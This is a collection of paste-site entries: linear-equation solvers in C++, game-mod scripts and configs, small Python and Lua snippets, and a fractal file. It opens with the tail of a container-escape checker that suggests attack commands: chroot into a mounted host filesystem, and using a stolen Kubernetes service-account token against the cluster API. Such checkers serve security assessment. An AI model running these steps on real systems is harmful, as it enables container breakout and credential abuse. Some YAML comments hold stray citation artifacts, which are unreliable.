    echo ""[!] Host filesystem appears mounted under /host""
    suggest_exploit ""Host mount detected"" \
      ""chroot /host /bin/bash""
  fi
}

function check_k8s_token() {
  if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    echo ""[!] Kubernetes service token found""
    suggest_exploit ""K8s API abuse via service token"" \
      ""curl -s --header \""Authorization: Bearer \$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\"" https://kubernetes.default""
  else
    echo ""[+] No K8s service account token found""
  fi
}

echo """"
check_path ""/dev/mem"" ""Can lead to host memory read/write if privileged""
check_host_proc_access
check_host_mount
check_cap_sys_admin
check_privileged_mode
check_docker_socket
check_k8s_token

echo """"
echo ""==== Check Complete. Use responsibly in lab environments only. ===="""
LUcaD4d8,СЛАУ Крамер,RobertDeMilo,C++,Saturday 26th of July 2025 03:07:08 PM CDT,"#include <iostream>
#include <iomanip>
#include <cmath>
#include <stdexcept>

using namespace std;

// Функция для выделения памяти под матрицу
double** allocate_matrix(int n, int m) {
    double** matrix = new double* [n];
    for (int i = 0; i < n; ++i) {
        matrix[i] = new double[m];
    }
    return matrix;
}

// Функция для освобождения памяти матрицы
void free_matrix(double** matrix, int n) {
    for (int i = 0; i < n; ++i) {
        delete[] matrix[i];
    }
    delete[] matrix;
}

// Функция вывода корней
void output_roots(double* roots, int n) {
    for (int i = 0; i < n; ++i) {
        cout << fixed << setprecision(6) << roots[i];
        if (i < n - 1) cout << "" "";
    }
    cout << endl;
}

// Функция для вычисления определителя матрицы
double determinant(double** matrix, int n) {
    double det = 1.0;

    // Создаем временную матрицу для вычислений
    double** temp = allocate_matrix(n, n);
    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < n; ++j) {
            temp[i][j] = matrix[i][j];
        }
    }

    // Приводим матрицу к верхнетреугольному виду
    for (int col = 0; col < n; ++col) {
        // Поиск ведущего элемента
        int max_row = col;
        for (int i = col + 1; i < n; ++i) {
            if (fabs(temp[i][col]) > fabs(temp[max_row][col])) {
                max_row = i;
            }
        }

        // Перестановка строк
        if (max_row != col) {
            for (int j = col; j < n; ++j) {
                swap(temp[col][j], temp[max_row][j]);
            }
            det *= -1; // При перестановке строк определитель меняет знак
        }

        // Если ведущий элемент нулевой, то определитель равен 0
        if (fabs(temp[col][col]) < 1e-10) {
            free_matrix(temp, n);
            return 0.0;
        }

        // Исключение переменной из других уравнений
        for (int i = col + 1; i < n; ++i) {
            double factor = temp[i][col] / temp[col][col];
            for (int j = col; j < n; ++j) {
                temp[i][j] -= temp[col][j] * factor;
            }
        }
    }

    // Вычисление определителя как произведения диагональных элементов
    for (int i = 0; i < n; ++i) {
        det *= temp[i][i];
    }

    free_matrix(temp, n);
    return det;
}

// Функция решения СЛАУ методом Крамера
int cramer(double** matrix, int n, int m, double* roots) {
    // Проверка на квадратную матрицу коэффициентов
    if (m != n + 1) {
        return 0;
    }

    // Создаем матрицу коэффициентов (без столбца свободных членов)
    double** A = allocate_matrix(n, n);
    double* B = new double[n];

    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < n; ++j) {
            A[i][j] = matrix[i][j];
        }
        B[i] = matrix[i][n];
    }

    // Вычисляем определитель основной матрицы
    double det_A = determinant(A, n);

    // Если определитель равен нулю, система либо не имеет решений, либо имеет бесконечно много
    if (fabs(det_A) < 1e-10) {
        free_matrix(A, n);
        delete[] B;
        return 0;
    }

    // Создаем временную матрицу для вычисления определителей
    double** temp = allocate_matrix(n, n);

    // Вычисляем корни по формулам Крамера
    for (int col = 0; col < n; ++col) {
        // Копируем матрицу A в temp
        for (int i = 0; i < n; ++i) {
            for (int j = 0; j < n; ++j) {
                temp[i][j] = A[i][j];
            }
        }

        // Заменяем колонку col на столбец свободных членов
        for (int i = 0; i < n; ++i) {
            temp[i][col] = B[i];
        }

        // Вычисляем определитель измененной матрицы
        double det_temp = determinant(temp, n);

        // Вычисляем корень
        roots[col] = det_temp / det_A;
    }

    free_matrix(A, n);
    free_matrix(temp, n);
    delete[] B;

    return 1;
}

int main() {
    int n, m;
    double** matrix = nullptr;
    double* roots = nullptr;

    try {
        cin >> n >> m;
        if (n <= 0 || m <= 0 || m != n + 1) {
            throw runtime_error(""Invalid input"");
        }

        matrix = allocate_matrix(n, m);
        roots = new double[n];

        for (int i = 0; i < n; ++i) {
            for (int j = 0; j < m; ++j) {
                cin >> matrix[i][j];
            }
        }

        if (cramer(matrix, n, m, roots)) {
            output_roots(roots, n);
        }
        else {
            cout << ""n/a"" << endl;
        }
    }
    catch (...) {
        cout << ""n/a"" << endl;
    }

    if (matrix) free_matrix(matrix, n);
    if (roots) delete[] roots;

    return 0;
}

Входные данные
3 4
1 1 1 2
4 5 3 7
2 7 7 9
Выходные данные 
1.000000 0.000000 1.000000"
MgXAJSHE,СЛАУ Гаусс,RobertDeMilo,C++,Saturday 26th of July 2025 03:00:38 PM CDT,"#include <iostream>
#include <iomanip>
#include <cmath>
#include <stdexcept>

using namespace std;

// Функция для выделения памяти под матрицу
double** allocate_matrix(int n, int m) {
    double** matrix = new double* [n];
    for (int i = 0; i < n; ++i) {
        matrix[i] = new double[m];
    }
    return matrix;
}

// Функция для освобождения памяти матрицы
void free_matrix(double** matrix, int n) {
    for (int i = 0; i < n; ++i) {
        delete[] matrix[i];
    }
    delete[] matrix;
}

// Функция ввода матрицы
void input(double** matrix, int* n, int* m) {
    cin >> *n >> *m;
    if (*n <= 0 || *m <= 0) {
        throw invalid_argument(""Invalid matrix dimensions"");
    }

    for (int i = 0; i < *n; ++i) {
        for (int j = 0; j < *m; ++j) {
            cin >> matrix[i][j];
        }
    }
}

// Функция вывода матрицы (для отладки)
void output(double** matrix, int n, int m) {
    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < m; ++j) {
            cout << fixed << setprecision(6) << matrix[i][j];
            if (j < m - 1) cout << "" "";
        }
        cout << endl;
    }
}

// Функция вывода корней
void output_roots(double* roots, int n) {
    for (int i = 0; i < n; ++i) {
        cout << fixed << setprecision(6) << roots[i];
        if (i < n - 1) cout << "" "";
    }
    cout << endl;
}

// Функция решения СЛАУ методом Гаусса
int sle(double** matrix, int n, int m, double* roots) {
    // Прямой ход метода Гаусса
    for (int col = 0; col < n; ++col) {
        // Поиск ведущего элемента
        int max_row = col;
        for (int i = col + 1; i < n; ++i) {
            if (fabs(matrix[i][col]) > fabs(matrix[max_row][col])) {
                max_row = i;
            }
        }

        // Перестановка строк
        if (max_row != col) {
            for (int j = col; j < m; ++j) {
                swap(matrix[col][j], matrix[max_row][j]);
            }
        }

        // Проверка на нулевой ведущий элемент
        if (fabs(matrix[col][col]) < 1e-10) {
            return 0; // Система вырождена
        }

        // Нормализация текущей строки
        for (int j = col + 1; j < m; ++j) {
            matrix[col][j] /= matrix[col][col];
        }
        matrix[col][col] = 1.0;

        // Исключение переменной из других уравнений
        for (int i = 0; i < n; ++i) {
            if (i != col && fabs(matrix[i][col]) > 1e-10) {
                double factor = matrix[i][col];
                for (int j = col; j < m; ++j) {
                    matrix[i][j] -= matrix[col][j] * factor;
                }
            }
        }
    }

    // Проверка на совместность системы
    for (int i = 0; i < n; ++i) {
        bool all_zero = true;
        for (int j = 0; j < m - 1; ++j) {
            if (fabs(matrix[i][j]) > 1e-10) {
                all_zero = false;
                break;
            }
        }
        if (all_zero && fabs(matrix[i][m - 1]) > 1e-10) {
            return 0; // Система несовместна
        }
    }

    // Проверка на бесконечное количество решений
    if (n < m - 1) {
        return 0; // Бесконечное количество решений
    }

    // Обратный ход - получение решения
    for (int i = 0; i < n; ++i) {
        roots[i] = matrix[i][m - 1];
    }

    return 1; // Успешное решение
}

int main() {
    int n, m;
    double** matrix = nullptr;
    double* roots = nullptr;

    try {
        cin >> n >> m;
        if (n <= 0 || m <= 0 || m != n + 1) {
            throw runtime_error(""Invalid input"");
        }

        matrix = allocate_matrix(n, m);
        roots = new double[n];

        for (int i = 0; i < n; ++i) {
            for (int j = 0; j < m; ++j) {
                cin >> matrix[i][j];
            }
        }

        if (sle(matrix, n, m, roots)) {
            output_roots(roots, n);
        }
        else {
            cout << ""n/a"" << endl;
        }
    }
    catch (...) {
        cout << ""n/a"" << endl;
    }

    if (matrix) free_matrix(matrix, n);
    if (roots) delete[] roots;

    return 0;
}
Входные данные
3 4
1 1 1 2
4 5 3 7
2 7 7 9
Выходные данные 
1.000000 0.000000 1.000000
"
GJvqikhu,ATM10 - ME Terminal to drawer back to ME Terminal,lui2k_,Lua,Saturday 26th of July 2025 01:05:31 PM CDT,"-- Wrap peripherals
local me = peripheral.wrap(""bottom"")  -- ME Bridge below
local drawer = peripheral.wrap(""left"") -- Drawer to the left
local monitor = peripheral.find(""monitor"")  -- Find connected monitor

-- Setup monitor
monitor.setTextScale(0.5)
monitor.clear()
local line = 1

-- Helper function to log to monitor with timestamp
local function log(message)
    local time = textutils.formatTime(os.time(), true)
    monitor.setCursorPos(1, line)
    monitor.write(""["" .. time .. ""] "" .. message)
    line = line + 1
    if line > 20 then
        monitor.scroll(1)
        line = 20
    end
end

-- Example item name (Stone Essence from Mystical Agriculture)
-- This will be overridden by whatever is in the drawer
local exampleItem = ""mysticalagriculture:stone_essence""

-- Detect item stored in drawer
local drawerContents = drawer.list()
local itemName = nil

for _, item in pairs(drawerContents) do
    itemName = item.name
    break  -- only one slot in 1x1 drawer
end

if not itemName then
    log(""No item found in drawer."")
    return
end

log(""🔍 Detected item: "" .. itemName .. "" (e.g., "" .. exampleItem .. "")"")

-- Step 1: Extract all matching items from ME into drawer
local items = me.getItems()
for _, item in pairs(items) do
    if item.name == itemName then
        local remaining = item.amount
        while remaining > 0 do
            local toExtract = math.min(remaining, 64)
            local extracted = me.exportItem({
                name = item.name,
                count = toExtract
            }, ""left"")

            log(""Extracted "" .. extracted .. "" "" .. itemName .. "" to drawer"")
            remaining = remaining - extracted
            if extracted == 0 then break end
        end
    end
end

-- Step 2: Re-insert all matching items from drawer back to ME
for slot, item in pairs(drawer.list()) do
    if item.name == itemName then
        local remaining = item.count
        while remaining > 0 do
            local toInsert = math.min(remaining, 64)
            local inserted = me.importItem({
                name = item.name,
                count = toInsert
            }, ""left"", slot)

            log(""Inserted "" .. inserted .. "" "" .. itemName .. "" from drawer slot "" .. slot)
            remaining = remaining - inserted
            if inserted == 0 then break end
        end
    end
end

log(""Cycle complete for item: "" .. itemName)
"
V10WnXzP,EndeletonSkills.yml,GamesofFreak,YAML,Saturday 26th of July 2025 01:00:26 PM CDT,"EndeletonShoot:
  Cooldown: 1.5
  Skills:
    # Randomly choose arrow damage between 7–9 (3.5–4.5 hearts)
    - shoot{type=ARROW;damage=7;velocity=5;chance=0.33} @target
    - shoot{type=ARROW;damage=8;velocity=5;chance=0.34} @target
    - shoot{type=ARROW;damage=9;velocity=5;chance=0.33} @target
    
EndeletonShootUnderwater:
  Cooldown: 1.5
  Skills:
    # Randomly choose arrow damage between 7–9 (3.5–4.5 hearts)
    - shoot{type=ARROW;damage=7;velocity=2.5;chance=0.33} @target
    - shoot{type=ARROW;damage=8;velocity=2.5;chance=0.34} @target
    - shoot{type=ARROW;damage=9;velocity=2.5;chance=0.33} @target

EndeletonShootBarrage:
  Cooldown: 0
  Skills:
    # Randomly choose arrow damage between 7–9 (3.5–4.5 hearts)
    - shoot{type=ARROW;damage=7;velocity=5;chance=0.33} @target
    - shoot{type=ARROW;damage=8;velocity=5;chance=0.34} @target
    - shoot{type=ARROW;damage=9;velocity=5;chance=0.33} @target
 
 EndeletonShootBarrageUnderwater:
  Cooldown: 0
  Skills:
    # Randomly choose arrow damage between 7–9 (3.5–4.5 hearts)
    - shoot{type=ARROW;damage=7;velocity=2.5;chance=0.33} @target
    - shoot{type=ARROW;damage=8;velocity=2.5;chance=0.34} @target
    - shoot{type=ARROW;damage=9;velocity=2.5;chance=0.33} @target

EndeletonTeleportOnDamage:
  Cooldown: 10
  Conditions:
    - incombat true
  Skills:
    # teleport to a random location up to 32 blocks away when hit or blocked
    - teleport{spreadh=10;spreadv=0;preserveyaw=true}
    - sound{s=entity.enderman.teleport} @self
    - effect:particles{particle=portal;amount=100;hS=1;vS=1;speed=1} @self
    
EndeletonTeleportOnMass:
  Cooldown: 30
  Conditions:
    - skillOnCooldown{skill=EndeletonTeleportOnDamage}
  Skills:
    # teleport to a random location up to 32 blocks away when hit or blocked
    - teleport{spreadh=4;spreadv=0;preserveyaw=true;repeat=4;repeatInterval=10}
    - sound{s=entity.enderman.teleport;repeat=4;repeatInterval=10} @self
    - effect:particles{particle=portal;amount=100;hS=1;vS=1;speed=1;repeat=4;repeatInterval=10} @self
    - skill{s=EndeletonShootBarrage;repeat=4;repeatInterval=10} ?!blocktype{type=water}
    - skill{s=EndeletonShootBarrageUnderwater;repeat=4;repeatInterval=10} ?blocktype{type=water}

EndeletonTeleportLOS:
  Cooldown: 10
  Conditions:
    - targetnotinlineofsight true  # only run if we can’t see our target:contentReference[oaicite:20]{index=20}
  Skills:
    # teleport away like an enderman when line‑of‑sight is broken
    - teleport{spreadh=32;spreadv=0;preserveyaw=true} @self

EndeletonTeleportOnDamageSuffocation:
  Cooldown: 0
  Conditions:
    - damagecause{cause=SUFFOCATION} true
  Skills:
    - teleport{spreadh=10;spreadv=0;preserveyaw=true} @self
    - sound{s=entity.enderman.teleport} @self
    - effect:particles{particle=portal;amount=100;hS=1;vS=1;speed=1} @self

EndeletonTeleportOnDamageLava:
  Cooldown: 0
  Conditions:
    - damagecause{cause=LAVA} true
  Skills:
    - teleport{spreadh=10;spreadv=0;preserveyaw=true} @self
    - sound{s=entity.enderman.teleport} @self
    - effect:particles{particle=portal;amount=100;hS=1;vS=1;speed=1} @self
    
EndeletonTeleportOnBowHit:
  Cooldown: 0
  Conditions:
    - damagecause{cause=PROJECTILE} true
  Skills:
    - CancelEvent
    - teleport{spreadh=10;spreadv=0;preserveyaw=true} @self
    - sound{s=entity.enderman.teleport} @self
    - effect:particles{particle=portal;amount=100;hS=1;vS=1;speed=1} @self"
ZVFymPDm,Endeleton.yml,GamesofFreak,YAML,Saturday 26th of July 2025 12:58:28 PM CDT,"Endeleton:
  Type: SKELETON                   # base entity
  Display: ""&5Endeleton""
  Health: 40                       # 40 health = 20 hearts:contentReference[oaicite:0]{index=0}
  Damage: 6                        # melee damage (3 hearts):contentReference[oaicite:1]{index=1}
  Armor: 6                         # base armor value like chainmail:contentReference[oaicite:2]{index=2}
  ArmorToughness: 1.5
  Equipment:
    - bow HAND
  Options:
    PreventSunburn: true
    KnockbackResistance: 0.20      # 0‑1 range:contentReference[oaicite:4]{index=4}
    MovementSpeed: 0.30            # custom movement speed:contentReference[oaicite:5]{index=5}
    FollowRange: 50                # detects players from farther away:contentReference[oaicite:6]{index=6}
    PreventOtherDrops: true        # disable vanilla drops
  # AI: use ranged & melee goals similar to skeletons
  AIGoalSelectors:
    - clear
    - bowattack
    - lookatplayers
    - randomstroll
    - randomlookaround
  AITargetSelectors:
    - clear
    - attacker
    - players
  # Skills: call our meta‑skills via triggers:contentReference[oaicite:7]{index=7}
  Skills:
    # shoot custom arrow when the mob fires a projectile (onShoot)
    - skill{s=EndeletonShoot} @target ~onShoot ?!blocktype{type=water}
    - skill{s=EndeletonShootUnderwater} @target ~onShoot ?blocktype{type=water}
    # teleport away when damaged (10 s cooldown)
    - skill{s=EndeletonTeleportOnDamage} @self ~onDamaged
    - skill{s=EndeletonTeleportOnEnterCombat} @self ~onDamaged
    - skill{s=EndeletonTeleportOnMass} @self ~onDamaged
    # periodically check line‑of‑sight and teleport away if broken
    - skill{s=EndeletonTeleportLOS} @self ~onTimer:100
    - skill{s=EndeletonTeleportOnDamageSuffocation} @self ~OnDamaged
    - skill{s=EndeletonTeleportOnDamageLava} @self ~OnDamaged
    - skill{s=EndeletonTeleportOnBowHit;sync=true} @self ~onDamaged
  # Custom drops (Bones, Arrows and Ender Pearl)
  Drops:                          # drop format: <item> <amount> <chance>:contentReference[oaicite:8]{index=8}
    - bone 2-6 1                 # 2–5 bones (upper bound is exclusive so 2‑6 yields 2‑5)
    - arrow 0-3 1                # 0–2 arrows
    - ender_pearl 1 0.3          # 30 % chance to drop 1 pearl
    - exp 8 1                    # 8 XP"
2ZJqDv5E,Python Warmup Player fighting stuff,AtEchoOff,Python,Saturday 26th of July 2025 11:38:14 AM CDT,"class Player:
    def __init__(self, name, health, attack):
        self.name = name
        self.health = health
        self.attack = attack

class Enemy:
    def __init__(self, name, health, attack):
        self.name = name
        self.health = health
        self.attack = attack

def fight(player, enemy):
    # Your code here
    return """"

# Example usage
p = Player(""Hero"", 100, 20)
e = Enemy(""Bat"", 50, 10)
print(fight(p, e))"
BTGGAQts,python3 googletrans,RicardasSim,Python,Saturday 26th of July 2025 11:24:20 AM CDT,"#pip install googletrans

import asyncio
from googletrans import Translator

async def TranslateText(text_to_translate):
  async with Translator() as translator:
    result = await translator.translate(text_to_translate, src=""en"", dest=""lt"")
    return result.text

text_src = ""In the velvet silence of deep space, ancient galaxies whisper secrets, as nebulae drift like forgotten dreams across the fabric of time.""
text_dest = asyncio.run(TranslateText(text_src))
print(text_dest)"
NpLXytaE,Strip PublicizedFrom attributes from lambdas,Velinquish,Python,Saturday 26th of July 2025 11:19:32 AM CDT,"""""""
Python script to clear all the PublicizedFrom attributes from lambdas
in its parent directory.

Put it in Assets/Scripts/Assembly-CSharp as strip_lambda_attributes.py,
open the folder in terminal, and run:
python strip_lambda_attributes.py
""""""

import os
import re

# Regex to match `[PublicizedFrom(...)]` before a lambda parameter
lambda_attr_regex = re.compile(
    r""""""\[\s*PublicizedFrom\s*\([^)]*\)\s*\]\s*(?=\()"""""",
    re.MULTILINE
)

def process_file(filepath):
    with open(filepath, ""r"", encoding=""utf-8"") as f:
        content = f.read()

    new_content, count = lambda_attr_regex.subn('', content)

    if count > 0:
        with open(filepath, ""w"", encoding=""utf-8"") as f:
            f.write(new_content)
        print(f""✅ Fixed {count} lambda(s) in {filepath}"")

def walk_and_process(directory):
    for root, _, files in os.walk(directory):
        for name in files:
            if name.endswith("".cs""):
                process_file(os.path.join(root, name))

if __name__ == ""__main__"":
    project_dir = os.getcwd()  # Run the script from the Unity project root
    print(f""🔍 Scanning project: {project_dir}"")
    walk_and_process(project_dir)
    print(""🎉 Done! All `[PublicizedFrom(...)]` lambdas cleaned."")"
Bbp46PuM,250726-1,rsidwell,XML,Saturday 26th of July 2025 11:05:03 AM CDT,"<flame name=""250726-1"" meta_info_uuid=""e95d15a3-7364-4c8f-8250-685454fb00e4"" version=""JWildfireSwan 0.110.1152"" size=""800 600"" center=""0.989123 0.787146"" scale=""50.0000000000"" rotate=""-7.9881433847"" filter=""0.7500000000"" filter_comparison_line=""0.0000000000"" filter_kernel=""MITCHELL_SMOOTH"" oversample=""1"" quality=""100.0000000000"" bg_transparency=""0"" fg_opacity=""1.0000000000"" brightness=""250.0000000000"" hue=""1.0000000000"" saturation=""1.0000000000"" lightness=""1.0000000000"" gamma=""7.3650000000"" gamma_threshold=""0.0100000000"" vibrancy=""1.0000000000"" contrast=""1.0000000000"" white_level=""220.0000000000"" temporal_samples=""1.0000000000"" cam_zoom=""1.9330000000"" cam_pitch=""0.0000000000"" cam_yaw=""0.0000000000"" cam_roll=""0.0000000000"" cam_persp=""0.0000000000"" cam_xfocus=""0.0000000000"" cam_yfocus=""0.0000000000"" cam_zfocus=""0.0000000000"" cam_pos_x=""0.0000000000"" cam_pos_y=""0.0000000000"" cam_pos_z=""0.0000000000"" cam_zpos=""0.0000000000"" cam_dof=""0.0000000000"" cam_dof_area=""0.5000000000"" cam_dof_exponent=""2.0000000000"" new_dof=""0"" low_density_brightness=""0.2400000000"" balancing_red=""1.0000000000"" balancing_green=""1.0000000000"" balancing_blue=""1.0000000000"" orientation=""landscape"" resolution_profile=""1024x768"" quality_profile=""preview"" swarm_size=""1024x1024"" de_radius=""1.0000000000"" de_curve=""0.8000000000"" de_comparison_line=""0.0000000000"" frame=""1"" frame_count=""100"" fps=""25"" is_looped=""0"" loop_frames=""0"" grad_edit_hue_curve_enabled=""false"" grad_edit_hue_curve_view_xmin=""-10"" grad_edit_hue_curve_view_xmax=""310"" grad_edit_hue_curve_view_ymin=""-120.0000000000"" grad_edit_hue_curve_view_ymax=""120.0000000000"" grad_edit_hue_curve_interpolation=""SPLINE"" grad_edit_hue_curve_selected_idx=""0"" grad_edit_hue_curve_locked=""false"" grad_edit_hue_curve_point_count=""12"" grad_edit_hue_curve_x0=""0"" grad_edit_hue_curve_y0=""247.9166666667"" grad_edit_hue_curve_x1=""23"" grad_edit_hue_curve_y1=""41.7796610169"" grad_edit_hue_curve_x2=""46"" grad_edit_hue_curve_y2=""42.5000000000"" grad_edit_hue_curve_x3=""70"" grad_edit_hue_curve_y3=""38.8043478261"" grad_edit_hue_curve_x4=""93"" grad_edit_hue_curve_y4=""39.1000000000"" grad_edit_hue_curve_x5=""116"" grad_edit_hue_curve_y5=""40.2631578947"" grad_edit_hue_curve_x6=""139"" grad_edit_hue_curve_y6=""41.6826923077"" grad_edit_hue_curve_x7=""162"" grad_edit_hue_curve_y7=""42.5000000000"" grad_edit_hue_curve_x8=""185"" grad_edit_hue_curve_y8=""41.2500000000"" grad_edit_hue_curve_x9=""209"" grad_edit_hue_curve_y9=""36.9565217391"" grad_edit_hue_curve_x10=""232"" grad_edit_hue_curve_y10=""37.5000000000"" grad_edit_hue_curve_x11=""255"" grad_edit_hue_curve_y11=""39.4642857143"" grad_edit_saturation_curve_enabled=""false"" grad_edit_saturation_curve_view_xmin=""-10"" grad_edit_saturation_curve_view_xmax=""310"" grad_edit_saturation_curve_view_ymin=""-120.0000000000"" grad_edit_saturation_curve_view_ymax=""120.0000000000"" grad_edit_saturation_curve_interpolation=""SPLINE"" grad_edit_saturation_curve_selected_idx=""0"" grad_edit_saturation_curve_locked=""false"" grad_edit_saturation_curve_point_count=""12"" grad_edit_saturation_curve_x0=""0"" grad_edit_saturation_curve_y0=""255.0000000000"" grad_edit_saturation_curve_x1=""23"" grad_edit_saturation_curve_y1=""240.7200000000"" grad_edit_saturation_curve_x2=""46"" grad_edit_saturation_curve_y2=""163.0327868852"" grad_edit_saturation_curve_x3=""70"" grad_edit_saturation_curve_y3=""202.2413793103"" grad_edit_saturation_curve_x4=""93"" grad_edit_saturation_curve_y4=""255.0000000000"" grad_edit_saturation_curve_x5=""116"" grad_edit_saturation_curve_y5=""230.7142857143"" grad_edit_saturation_curve_x6=""139"" grad_edit_saturation_curve_y6=""228.6206896552"" grad_edit_saturation_curve_x7=""162"" grad_edit_saturation_curve_y7=""217.2222222222"" grad_edit_saturation_curve_x8=""185"" grad_edit_saturation_curve_y8=""216.7500000000"" grad_edit_saturation_curve_x9=""209"" grad_edit_saturation_curve_y9=""234.6000000000"" grad_edit_saturation_curve_x10=""232"" grad_edit_saturation_curve_y10=""255.0000000000"" grad_edit_saturation_curve_x11=""255"" grad_edit_saturation_curve_y11=""238.0000000000"" grad_edit_luminosity_curve_enabled=""false"" grad_edit_luminosity_curve_view_xmin=""-10"" grad_edit_luminosity_curve_view_xmax=""310"" grad_edit_luminosity_curve_view_ymin=""-120.0000000000"" grad_edit_luminosity_curve_view_ymax=""120.0000000000"" grad_edit_luminosity_curve_interpolation=""SPLINE"" grad_edit_luminosity_curve_selected_idx=""0"" grad_edit_luminosity_curve_locked=""false"" grad_edit_luminosity_curve_point_count=""12"" grad_edit_luminosity_curve_x0=""0"" grad_edit_luminosity_curve_y0=""60.0000000000"" grad_edit_luminosity_curve_x1=""23"" grad_edit_luminosity_curve_y1=""130.0000000000"" grad_edit_luminosity_curve_x2=""46"" grad_edit_luminosity_curve_y2=""122.0000000000"" grad_edit_luminosity_curve_x3=""70"" grad_edit_luminosity_curve_y3=""58.0000000000"" grad_edit_luminosity_curve_x4=""93"" grad_edit_luminosity_curve_y4=""50.0000000000"" grad_edit_luminosity_curve_x5=""116"" grad_edit_luminosity_curve_y5=""84.0000000000"" grad_edit_luminosity_curve_x6=""139"" grad_edit_luminosity_curve_y6=""116.0000000000"" grad_edit_luminosity_curve_x7=""162"" grad_edit_luminosity_curve_y7=""108.0000000000"" grad_edit_luminosity_curve_x8=""185"" grad_edit_luminosity_curve_y8=""80.0000000000"" grad_edit_luminosity_curve_x9=""209"" grad_edit_luminosity_curve_y9=""50.0000000000"" grad_edit_luminosity_curve_x10=""232"" grad_edit_luminosity_curve_y10=""34.0000000000"" grad_edit_luminosity_curve_x11=""255"" grad_edit_luminosity_curve_y11=""60.0000000000"" grad_edit_color_curves=""hsl"" gradient_mod_shift=""0.0000000000"" image_mix_value=""0.1250000000"">
  <xform weight=""1.5120000000"" color_type=""DIFFUSION"" color=""0.0000000000"" symmetry=""0.0000000000"" opacity=""1.0000000000"" julian=""1.0000000000"" julian_fx_priority=""0"" julian_power=""-2"" julian_dist=""1.0000000000"" coefs=""0.8436566115 0.3860094779 -0.3860094779 0.8436566115 -0.8226782888 0.0313999347"" chaos=""1.000000 1.000000""/>
  <xform weight=""0.5000000000"" color_type=""DIFFUSION"" color=""0.0000000000"" symmetry=""0.0000000000"" opacity=""1.0000000000"" de_stijl=""1.0000000000"" de_stijl_fx_priority=""0"" de_stijl_max_size=""0.3661677375"" de_stijl_min_size=""0.2568910200"" de_stijl_chaos=""0.8407750932"" de_stijl_line_thickness=""0.5600000000"" de_stijl_seed=""567749"" coefs=""0.9990000000 -0.0370000000 0.0370000000 0.9990000000 0.2072395689 0.2197995428"" post=""0.6140000000 0.7380000000 -0.7380000000 0.6140000000 1.7370000000 -0.2280000000"" chaos=""1.000000 1.000000""/>
  <finalxform weight=""0.0000000000"" color_type=""NONE"" color=""0.0000000000"" symmetry=""1.0000000000"" opacity=""1.0000000000"" horseshoe=""1.0000000000"" horseshoe_fx_priority=""0"" coefs=""1.0000000000 0.0000000000 0.0000000000 1.0000000000 0.5714788113 0.1381597126""/>
  <palette count=""256"" format=""RGB"">
7800147870047C7404807804847C048880048C8404908804948C049890089894089C9808
A09C08A4A008A8A408ACA808B0AC08B4B008B8B408BCB808C0BC08C4C008C8C40CCCC80C
D0CC0CD4D00CD8D40CDCD80CE0DC0CE4E00CE8E40CECE80CF0EC0CF4F00CF8F40CFCFC10
FCFC10FCFC10FCFC10FCFC10FCFC10FCFC14FCFC20FCFC2CFCFC3CF8F83CF4F43CF0F03C
ECEC38E8E838E4E438E0E034DCDC34D8D834D4D430D0D030CCCC30C8C82CC4C42CC0C02C
BCB828B8B428B4B028B0AC24ACA824A8A424A4A020A09C209C982098941C94901C908C1C
8C88188884188480188078147C7414787014746C107068106C641068600C645C0C60580C
5C5408585008544C085048044C4404484004443800443800483C004840004C4000504400
504800544800584C005850005C5000605400605800645800645C006860006C60006C6404
706804746804746C047870047C70047C7404807804807804847C048880048880048C8404
908804908804948C049890089890089C94089C9808A09808A49C08A4A008A8A008ACA408
ACA808B0A808B4AC08B4B008B8B008B8B408BCB808C0B808C0BC0CC4C00CC8C00CC8C40C
CCC80CD0C80CD0CC0CD4D00CD4D00CD8D40CDCD80CDCD80CE0DC0CE4E00CE4E00CE8E40C
ECE810ECEC10ECEC10E8E810E8E810E4E410E4E010E0E010E0DC10DCDC10D8D810D8D410
D4D410D4D010D0D010D0CC10CCC810C8C810C8C410C4C410C4C010C0BC10C0BC0CBCB80C
B8B80CB8B40CB4B00CB4B00CB0AC0CB0AC0CACA80CA8A40CA8A40CA4A00CA4A00CA09C0C
A0980C9C980C98940C98940C94900C948C0C908C089088088C84088C8408888008848008
847C088078088078087C74087C7408787008746C08746C087068087068086C64086C6008
686008645C08645C046058046054045C54045C5004585004544C04544804504804504404
4C44044C4004483C04443C044438044038044034043C30043C3004382C04342800342C00
3830003C3400403800443C004840004C4400504800544C005850005C5400605800645C04
6860046C6404706804746C04  </palette>
</flame>"
Qhuz0tt6,system_info.sh,sergio_educacionit,Bash,Saturday 26th of July 2025 10:14:14 AM CDT,"#!/bin/bash
# Variables
kernel_name=$(uname -s)
kernel_version=$(uname -r)
architecture=$(uname -p)

echo ""Información del kernel:""
echo ""kernel name: $kernel_name""
echo ""kernel version: $kernel_version""
echo ""architecture: $architecture""
"
Pf2f4TXv,almas.py,leanchec,Python,Saturday 26th of July 2025 09:53:30 AM CDT,"linha = input().split()
n = int(linha[0])
k = int(linha[1])

auxA = input().split()
auxB = input().split()

resp = 0
sempre = 0
A = []
B = []

for i in range(n):
    a = int(auxA[i])
    b = int(auxB[i])

    if a+b <= k+1:
        sempre+=1
    else:
        if a <= k:
            A.append(a)
        if b <= k:
            B.append(b)

A.sort()
B.sort()


resp = len(B)

p1 = 0
p2 = len(B)-1

while p1<len(A):
    while p2>=0 and A[p1] + B[p2] > k:
        p2-=1
    resp = max(resp, (p1+1)+(p2+1))
    p1+=1

print(resp+sempre)
"
hye9KbNV,entoru,Scetch2003,Lua,Saturday 26th of July 2025 09:50:02 AM CDT,"local ru_map = {
    F = ""\190"",     [""<""] = ""\191"", D = ""\192"",
    U = ""\193"",     L = ""\194"",     T = ""\195"",
    [""~""] = ""\196"", ["":""] = ""\197"", P = ""\198"",
    B = ""\199"",     Q = ""\200"",     R = ""\201"",
    K = ""\202"",     V = ""\203"",     Y = ""\204"",
    J = ""\205"",     G = ""\206"",     H = ""\207"",
    C = ""\208"",     N = ""\209"",     E = ""\210"",
    A = ""\211"",     [""{""] = ""\212"", W = ""\213"",
    X = ""\214"",     I = ""\215"",     O = ""\216"",
    [""}""] = ""\217"", S = ""\218"",     M = ""\219"",
    ['""'] = ""\220"", ["">""] = ""\221"", Z = ""\222"",

    f = ""\223"",     ["",""] = ""\224"", d = ""\225"",
    u = ""\226"",     l = ""\227"",     t = ""\228"",
    [""`""] = ""\229"", ["";""] = ""\230"", p = ""\231"",
